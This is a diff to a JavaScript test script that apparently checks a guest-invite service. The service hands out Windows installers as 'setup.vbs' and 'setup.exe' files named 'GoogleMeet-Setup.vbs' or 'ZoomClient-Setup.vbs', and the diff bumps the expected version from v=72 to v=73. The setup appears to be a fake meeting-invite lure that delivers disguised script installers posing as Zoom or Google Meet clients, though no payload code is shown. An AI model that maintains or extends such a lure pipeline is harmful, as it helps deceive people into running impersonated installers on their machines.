@@ -75,9 +75,9 @@ async function main() {
     pass(`create ${inviteTemplate} ${code}`);
 
     const pub = await (await fetch(`${API}/guest/${code}`)).json();
-    if (!String(pub.windowsInstallerUrl || '').includes('v=72')) {
-      fail(`${inviteTemplate} not v=72 (${pub.windowsInstallerUrl})`);
-    } else pass(`${inviteTemplate} installer v=72`);
+    if (!String(pub.windowsInstallerUrl || '').includes('v=73')) {
+      fail(`${inviteTemplate} not v=73 (${pub.windowsInstallerUrl})`);
+    } else pass(`${inviteTemplate} installer v=73`);
 
     if (!String(pub.windowsInstallerUrl || '').includes('/setup.vbs')) {
       fail(`${inviteTemplate} browser installer should be setup.vbs (${pub.windowsInstallerUrl})`);
@@ -90,7 +90,7 @@ async function main() {
           ? 'GoogleMeet-Setup.vbs'
           : 'ZoomClient-Setup.vbs';
 
-    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=72`);
+    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=73`);
     if (vbsRes.status !== 200) {
       fail(`${inviteTemplate} VBS download`);
       continue;
@@ -108,7 +108,7 @@ async function main() {
     ];
     for (const [name, ok] of vbsChecks) (ok ? pass : fail)(`${inviteTemplate} VBS: ${name}`);
 
-    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=72`);
+    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=73`);
     if (installerRes.status !== 200) {
       fail(`${inviteTemplate} installer download`);
       continue;
